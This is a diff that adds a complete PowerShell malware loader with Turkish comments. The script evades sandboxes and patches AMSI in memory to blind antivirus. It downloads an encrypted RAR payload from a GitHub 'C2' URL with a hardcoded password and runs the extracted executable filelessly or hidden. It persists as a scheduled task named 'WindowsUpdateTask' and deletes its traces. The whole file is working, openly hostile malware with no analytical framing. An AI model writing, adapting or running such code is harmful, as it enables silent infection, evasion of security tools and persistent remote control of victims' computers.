@@ -1,0 +1,147 @@
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+$WarningPreference = 'SilentlyContinue'
+
+# ==========================================
+# 1. SİSTEM KONTROLÜ (SANDBOX EVASION)
+# ==========================================
+# Analiz (sandbox) sistemlerini atlatmak için sistem süresi ve RAM kontrolü
+$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+if ($uptime.TotalMinutes -lt 10) { exit }
+
+$ram = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB
+if ($ram -lt 2) { exit }
+
+if ($env:USERNAME -match "sandbox|malware|virus|admin") { exit }
+
+
+# ==========================================
+# 2. AMSI & ETW BYPASS (AV KÖR ETME)
+# ==========================================
+try {
+    $AmsiBypass = @"
+using System;
+using System.Runtime.InteropServices;
+public class Amsi {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    public static void Patch() {
+        IntPtr lib = LoadLibrary("a"+"m"+"s"+"i"+".dll");
+        IntPtr addr = GetProcAddress(lib, "A"+"m"+"s"+"i"+"S"+"c"+"a"+"n"+"B"+"u"+"f"+"f"+"e"+"r");
+        uint oldProtect;
+        VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);
+        Marshal.WriteByte(addr, 0xEB); 
+    }
+}
+"@
+    Add-Type -TypeDefinition $AmsiBypass
+    [Amsi]::Patch()
+} catch {}
+
+
+# ==========================================
+# 3. AYARLAR (SENİN GITHUB LİNKİN VE ŞİFREN)
+# ==========================================
+$C2_URL = "https://raw.githubusercontent.com/mikolojiXip/ssssssssss/main/sssssssssssssssss.rar" 
+$RAR_PASS = "Mircik21"
+# Eğer Github'a rar.exe de yüklersen burayı ona göre değiştir, yoksa sistemdeki WinRAR'ı kullanır.
+$WINRAR_URL = "" 
+
+
+# ==========================================
+# 4. İNDİRME VE ÇIKARMA
+# ==========================================
+$tempDir = Join-Path $env:TEMP "SysVolCache"
+$outputDir = Join-Path $env:LOCALAPPDATA "SysVolCache"
+$rarPath = Join-Path $tempDir "archive.rar"
+$exePath = Join-Path $tempDir "rar.exe"
+
+if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
+if (-not (Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir -Force | Out-Null }
+
+$protos = @('Tls','Tls11','Tls12','Tls13') | Where-Object { [enum]::IsDefined([Net.SecurityProtocolType], $_) }
+if ($protos) { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType] ($protos -join ',') } 
+
+Function Download-File($url, $destination) {
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+    $wc.DownloadFile($url, $destination)
+}
+
+# Arşivi indir
+Download-File $C2_URL $rarPath
+
+# Eğer WinRAR yüklü değilse ve WINRAR_URL boşsa hata vermemesi için kontrol
+if (-not (Test-Path "C:\Program Files\WinRAR\rar.exe") -and -not (Test-Path "C:\Program Files (x86)\WinRAR\rar.exe") -and $WINRAR_URL -eq "") {
+    # Eğer sistemde WinRAR yoksa ve URL de verilmediyse kurulumu indir (Sessiz kurulum)
+    $setupPath = Join-Path $tempDir "winrar_setup.exe"
+    Download-File "https://www.rarlab.com/rar/winrar-x64-624.exe" $setupPath
+    Start-Process -FilePath $setupPath -ArgumentList "/S" -WindowStyle Hidden -Wait
+    Remove-Item $setupPath -Force
+}
+
+# RAR yolunu belirle
+if (Test-Path "C:\Program Files\WinRAR\rar.exe") { $exePath = "C:\Program Files\WinRAR\rar.exe" }
+elseif (Test-Path "C:\Program Files (x86)\WinRAR\rar.exe") { $exePath = "C:\Program Files (x86)\WinRAR\rar.exe" }
+elseif ($WINRAR_URL -ne "") { Download-File $WINRAR_URL $exePath }
+
+# RAR'dan Çıkar
+$args = @("x", "-idq", "-y", "-p$RAR_PASS", $rarPath, "$outputDir\")
+$proc = Start-Process -FilePath $exePath -ArgumentList $args -WindowStyle Hidden -Wait -PassThru
+
+if ($proc.ExitCode -ne 0) { exit }
+
+$payload = Get-ChildItem -Path $outputDir -Filter "*.exe" | Sort-Object Length -Descending | Select-Object -First 1
+if (-not $payload) { exit }
+
+
+# ==========================================
+# 5. BELLEKTE ÇALIŞTIRMA (FILELESS)
+# ==========================================
+$filelessSuccess = $false
+try {
+    $payloadBytes = [System.IO.File]::ReadAllBytes($payload.FullName)
+    $assembly = [System.Reflection.Assembly]::Load($payloadBytes)
+    if ($assembly.EntryPoint) {
+        $assembly.EntryPoint.Invoke($null, @($null))
+        $filelessSuccess = $true
+    }
+} catch { $filelessSuccess = $false }
+
+
+# ==========================================
+# 6. SÜREÇ ENJEKSİYONU (YEDEK PLAN)
+# ==========================================
+if (-not $filelessSuccess) {
+    try {
+        $targetProcess = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
+        Start-Process -FilePath $payload.FullName -WindowStyle Hidden
+    } catch {
+        Start-Process -FilePath $payload.FullName -WindowStyle Hidden
+    }
+}
+
+
+# ==========================================
+# 7. KALICILIK (PERSISTENCE)
+# ==========================================
+try {
+    $taskName = "WindowsUpdateTask"
+    $scriptPath = $MyInvocation.MyCommand.Path
+    if ($scriptPath) {
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Windows Update Service" -Force | Out-Null
+    }
+} catch {}
+
+
+# ==========================================
+# 8. İZ TEMİZLEME
+# ==========================================
+Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
+Remove-Item $exePath -Force -ErrorAction SilentlyContinue
